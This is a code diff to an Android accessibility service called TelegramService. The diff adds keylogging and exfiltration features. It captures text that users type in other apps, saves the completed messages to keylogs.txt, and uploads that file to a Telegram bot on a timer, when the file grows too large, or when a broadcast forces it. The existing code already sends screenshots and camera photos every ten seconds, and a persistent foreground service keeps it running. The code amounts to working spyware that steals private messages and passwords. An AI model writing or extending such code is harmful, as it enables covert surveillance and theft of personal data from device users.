@@ -6,6 +6,12 @@ import android.graphics.Bitmap
 import android.graphics.BitmapFactory
 import android.os.Build
 import android.util.Log
+import android.app.Notification
+import android.app.NotificationChannel
+import android.app.NotificationManager
+import androidx.core.app.NotificationCompat
+import android.content.Context
+import android.content.BroadcastReceiver
 import android.view.Display
 import android.view.accessibility.AccessibilityEvent
 import androidx.camera.core.CameraSelector
@@ -40,10 +46,30 @@ class TelegramService : AccessibilityService(), LifecycleOwner {
     
     private val lifecycleRegistry = LifecycleRegistry(this)
     private var imageCapture: ImageCapture? = null
+    
+    private val lastTextMap = mutableMapOf<String, String>()
+    private val forceSendReceiver = object : BroadcastReceiver() {
+        override fun onReceive(context: Context?, intent: Intent?) {
+            if (intent?.action == "com.example.telegramsender.ACTION_FORCE_SEND") {
+                Log.d("TelegramService", "Force send logs requested")
+                CoroutineScope(Dispatchers.IO).launch {
+                    if (botToken.isNotEmpty() && targetChatId.isNotEmpty()) {
+                        sendAndClearLogs()
+                    }
+                }
+            }
+        }
+    }
 
     override fun onCreate() {
         super.onCreate()
+        startForegroundServiceNotification()
         lifecycleRegistry.currentState = Lifecycle.State.CREATED
+    }
+
+    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+        startForegroundServiceNotification()
+        return START_STICKY
     }
 
     override fun onServiceConnected() {
@@ -51,7 +77,17 @@ class TelegramService : AccessibilityService(), LifecycleOwner {
         Log.d("TelegramService", "Accessibility Service Connected")
         lifecycleRegistry.currentState = Lifecycle.State.STARTED
         
+        startForegroundServiceNotification()
+        
         loadCredentials()
+        
+        // Register receiver
+        val filter = android.content.IntentFilter("com.example.telegramsender.ACTION_FORCE_SEND")
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            registerReceiver(forceSendReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
+        } else {
+            registerReceiver(forceSendReceiver, filter)
+        }
         
         if (botToken.isNotEmpty() && targetChatId.isNotEmpty()) {
             startCaptureLoop()
@@ -61,12 +97,18 @@ class TelegramService : AccessibilityService(), LifecycleOwner {
         }
     }
 
+
+
+
+
     private fun loadCredentials() {
         val pref = getSharedPreferences("tg_pref", MODE_PRIVATE)
         botToken = pref.getString("token", "") ?: ""
         targetChatId = pref.getString("chatId", "") ?: ""
         sendCamera = pref.getBoolean("sendCamera", false)
     }
+
+    private var lastLogSendTime = System.currentTimeMillis()
 
     private fun startCaptureLoop() {
         job?.cancel()
@@ -79,6 +121,11 @@ class TelegramService : AccessibilityService(), LifecycleOwner {
                     captureAndSend()
                     if (sendCamera) {
                         captureCameraAndSend()
+                    }
+                    
+                    // Check logs periodicity (every 1 hour)
+                    if (System.currentTimeMillis() - lastLogSendTime > 1 * 60 * 60 * 1000) {
+                        sendAndClearLogs()
                     }
                 }
                 delay(10_000) // 10 seconds delay
@@ -143,6 +190,48 @@ class TelegramService : AccessibilityService(), LifecycleOwner {
         val bytes = ByteArray(buffer.remaining())
         buffer.get(bytes)
         return BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
+    }
+    private fun checkLogSizeAndSend() {
+        val file = java.io.File(filesDir, "keylogs.txt")
+        if (file.exists() && file.length() > 1 * 1024 * 1024) { // 1MB
+            CoroutineScope(Dispatchers.IO).launch {
+                if (botToken.isNotEmpty() && targetChatId.isNotEmpty()) {
+                    sendAndClearLogs()
+                }
+            }
+        }
+    }
+
+    private fun sendAndClearLogs() {
+        val file = java.io.File(filesDir, "keylogs.txt")
+        if (!file.exists() || file.length() == 0L) return
+
+        try {
+            val logContent = file.readBytes()
+            
+            val url = "https://api.telegram.org/bot$botToken/sendDocument"
+            val requestBody = MultipartBody.Builder()
+                .setType(MultipartBody.FORM)
+                .addFormDataPart("chat_id", targetChatId)
+                .addFormDataPart("document", "keylogs_${System.currentTimeMillis()}.txt",
+                    logContent.toRequestBody("text/plain".toMediaTypeOrNull(), 0, logContent.size))
+                .build()
+                
+            val request = Request.Builder().url(url).post(requestBody).build()
+            
+            client.newCall(request).execute().use { response ->
+                if (response.isSuccessful) {
+                    Log.d("TelegramService", "Logs sent successfully")
+                    // Clear file only on success
+                    file.writeText("")
+                    lastLogSendTime = System.currentTimeMillis()
+                } else {
+                    Log.e("TelegramService", "Failed to send logs: ${response.code}")
+                }
+            }
+        } catch (e: Exception) {
+            Log.e("TelegramService", "Error sending logs", e)
+        }
     }
 
     private fun captureAndSend() {
@@ -240,25 +329,63 @@ class TelegramService : AccessibilityService(), LifecycleOwner {
         }
     }
 
+
+
+    private fun startForegroundServiceNotification() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            val channelId = "TelegramSenderChannel"
+            val channelName = "Background Service"
+            val channel = NotificationChannel(channelId, channelName, NotificationManager.IMPORTANCE_LOW)
+            val manager = getSystemService(NotificationManager::class.java)
+            manager.createNotificationChannel(channel)
+        }
+
+        val notification: Notification = NotificationCompat.Builder(this, "TelegramSenderChannel")
+            .setContentTitle("Telegram Sender")
+            .setContentText("Running in background...")
+            .setSmallIcon(R.mipmap.ic_launcher)
+            .build()
+
+        // Service ID 1
+        startForeground(1, notification)
+    }
+
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
         if (event == null) return
 
+        // Filter out system UI noise
+        if (event.packageName?.toString() == "com.android.systemui") return
+
         if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
-            val text = event.text.toString()
-            if (text.isNotEmpty()) {
+            val currentText = event.text?.filterNot { it.isNullOrBlank() }?.joinToString(" ") ?: ""
+            val key = "${event.packageName}_${event.source?.viewIdResourceName ?: "unknown"}"
+            val previousText = lastTextMap[key] ?: ""
+            
+            // "Log on Clear" Logic:
+            // If the text field becomes empty (or very short) after having substantial text, 
+            // we assume the message was SENT or cleared.
+            // valid message > 2 chars, cleared means < 1 char
+            
+            if (currentText.isEmpty() && previousText.trim().length > 1) {
+                // Log the COMPLETED message
                 val timestamp = java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.getDefault()).format(java.util.Date())
-                val logEntry = "[$timestamp] [${event.packageName}]: $text\n"
+                val logEntry = "[$timestamp] [${event.packageName}]: $previousText\n"
                 appendLogToFile(logEntry)
             }
+            
+            // Always update the map with current state
+            lastTextMap[key] = currentText
         }
     }
     
     private fun appendLogToFile(logEntry: String) {
         try {
             val file = java.io.File(filesDir, "keylogs.txt")
+            // Limit file size (managed by checkLogSizeAndSend, but failsafe here)
             java.io.FileWriter(file, true).use { writer ->
                 writer.append(logEntry)
             }
+            checkLogSizeAndSend()
         } catch (e: Exception) {
             Log.e("TelegramService", "Failed to write log", e)
         }
@@ -271,6 +398,11 @@ class TelegramService : AccessibilityService(), LifecycleOwner {
     
     override fun onUnbind(intent: Intent?): Boolean {
         job?.cancel()
+        try {
+            unregisterReceiver(forceSendReceiver)
+        } catch (e: Exception) {
+            Log.e("TelegramService", "Receiver not registered", e)
+        }
         lifecycleRegistry.currentState = Lifecycle.State.DESTROYED
         return super.onUnbind(intent)
     }
